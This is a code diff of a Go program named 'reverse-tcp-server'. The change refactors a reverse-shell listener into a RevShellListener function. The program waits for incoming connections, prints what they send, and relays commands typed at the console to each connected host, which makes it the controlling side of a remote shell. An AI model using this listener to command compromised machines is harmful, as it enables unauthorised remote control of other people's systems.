@@ -11,20 +11,23 @@ import (
 	"time"
 )
 
-func main() {
-	arguments := os.Args
-	if len(arguments) == 1 {
-		fmt.Errorf("Usage: ./reverse-tcp-server <port_number>")
-		return
-	}
-	fmt.Printf("Starting\n")
-	PORT := ":" + arguments[1]
-	conn, err := net.Listen("tcp4", PORT)
+const (
+	connType = "tcp"
+)
+
+func RevShellListener(port string, done chan<- bool) {
+	fmt.Printf("Starting listener...\n")
+	port = ":" + port
+	conn, err := net.Listen("tcp4", port)
 	if err != nil {
-		fmt.Println(err)
+		fmt.Println("listening error: ", err)
 		return
 	}
-	defer conn.Close()
+	defer func() {
+		conn.Close()
+		done <- true
+	}()
+
 	rand.Seed(time.Now().Unix())
 
 	for {
@@ -43,20 +46,21 @@ func handleConnection(conn net.Conn) {
 
 	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
 	reader := bufio.NewReader(os.Stdin)
+
 	go func() {
 		_, err := io.Copy(os.Stdout, conn)
 		if err != nil {
+			fmt.Println("close connection...")
 			return
 		}
 	}()
-
 	for {
-		fmt.Println("Reading...")
 		toExec, err := reader.ReadBytes('\n')
 		if err != nil {
 			fmt.Println("read error")
 			break
 		}
+
 		temp := strings.TrimSpace(string(toExec))
 		//fmt.Printf("Executing: %s\n", temp)
 		_, err = fmt.Fprintf(conn, "%s\n", temp)
@@ -67,4 +71,19 @@ func handleConnection(conn net.Conn) {
 
 	}
 
+}
+
+func main() {
+	arguments := os.Args
+	done := make(chan bool)
+	if len(arguments) == 1 {
+		fmt.Errorf("Usage: ./reverse-tcp-server <port_number>")
+		return
+	}
+
+	fmt.Printf("Starting\n")
+
+	go RevShellListener(arguments[1], done)
+	<-done
+	fmt.Println("Finished")
 }
